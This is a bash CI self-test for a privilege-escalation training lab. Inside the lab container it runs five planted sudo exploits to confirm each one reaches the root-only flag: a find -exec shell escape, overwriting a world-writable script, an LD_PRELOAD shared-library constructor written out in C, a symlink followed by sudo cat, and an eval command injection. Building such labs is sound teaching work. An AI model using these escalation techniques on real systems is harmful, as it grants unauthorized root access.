#!/usr/bin/env bash
# =============================================================================
#  Road to Root — sudo lab self-test
#
#  Arms every planted sudo path on "The Trusted Shortcut" box, then asserts
#  each path reaches root by writing a world-readable proof file containing
#  the root-only flag. Also checks the flag is NOT readable without exploiting.
#
#  Run it as labuser1 INSIDE the target container:
#     docker cp tests/verify_sudo.sh target-sudo:/tmp/
#     docker exec -u labuser1 target-sudo bash /tmp/verify_sudo.sh
#
#  Exit 0 = all five paths worked. Non-zero = something is broken.
#  (Used by CI.)
# =============================================================================
set -u
FLAG='R2R{'
P=/tmp/rtr_proof              # each station writes ${P}_<x>

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without root (setup is broken!)"
  exit 1
else
  echo "  [PASS] control — flag is root-only (Permission denied, as expected)"
fi

# Clean slate
rm -f ${P}_a ${P}_b ${P}_c ${P}_d ${P}_e /tmp/pwnc.c /tmp/pwnc.so 2>/dev/null || true
# D's sudo cat may have left a labuser1-owned proof from a previous run; remove.
rm -f /var/log/app/pwn.log 2>/dev/null || true

echo "== arming all five sudo paths =="

# A — NOPASSWD on find: -exec runs anything as root.
sudo /usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -c "cp /root/flag.txt ${P}_a; chmod 644 ${P}_a" \;
echo "  armed A  -> sudo find -exec /bin/sh -c '...'"

# B — NOPASSWD on world-writable script: overwrite, then sudo-run.
cat > /opt/admin/backup.sh << EOF
#!/bin/bash
cp /root/flag.txt ${P}_b && chmod 644 ${P}_b
EOF
sudo /opt/admin/backup.sh
echo "  armed B  -> overwrite /opt/admin/backup.sh, sudo-run"

# C — env_keep LD_PRELOAD: constructor fires as root when sudo'd binary starts.
# CRITICAL: unsetenv("LD_PRELOAD") first, or system() -> sh -> loads pwnc.so ->
# constructor fires again -> system() -> ... (recursive forkbomb, OOM-killed).
cat > /tmp/pwnc.c << EOF
#include <stdlib.h>
__attribute__((constructor))
void pwn(void) {
    unsetenv("LD_PRELOAD");
    system("cp /root/flag.txt ${P}_c && chmod 644 ${P}_c");
}
EOF
gcc -shared -fPIC /tmp/pwnc.c -o /tmp/pwnc.so 2>/dev/null
sudo LD_PRELOAD=/tmp/pwnc.so /usr/sbin/rtr-health >/dev/null 2>&1
echo "  armed C  -> sudo LD_PRELOAD=/tmp/pwnc.so /usr/sbin/rtr-health"

# D — sudoers wildcard + symlink: cat follows symlink through to flag.
ln -sf /root/flag.txt /var/log/app/pwn.log
sudo /usr/bin/cat /var/log/app/pwn.log > ${P}_d 2>/dev/null
chmod 644 ${P}_d 2>/dev/null
echo "  armed D  -> ln -s /root/flag.txt /var/log/app/pwn.log; sudo cat it"

# E — eval injection in sudo'd script: argv flows into eval as root.
sudo /opt/admin/add-contact.sh "x; cp /root/flag.txt ${P}_e; chmod 644 ${P}_e"
echo "  armed E  -> sudo /opt/admin/add-contact.sh with eval injection"

echo "== results =="
PASS=0; FAIL=0
labels_a="A  NOPASSWD on find (GTFOBins shell escape)"
labels_b="B  NOPASSWD on world-writable script"
labels_c="C  env_keep LD_PRELOAD"
labels_d="D  sudoers wildcard + symlink"
labels_e="E  eval injection in sudo'd script"
for x in a b c d e; do
  eval "label=\$labels_$x"
  if [ -f "${P}_$x" ] && grep -q "$FLAG" "${P}_$x" 2>/dev/null; then
    echo "  [PASS] $label"; PASS=$((PASS + 1))
  else
    echo "  [FAIL] $label  (expected ${P}_$x to contain $FLAG)"; FAIL=$((FAIL + 1))
  fi
done

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 5 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL SUDO PATHS REACH ROOT -- OK"
  exit 0
else
  echo "  SOME PATHS FAILED"
  exit 1
fi
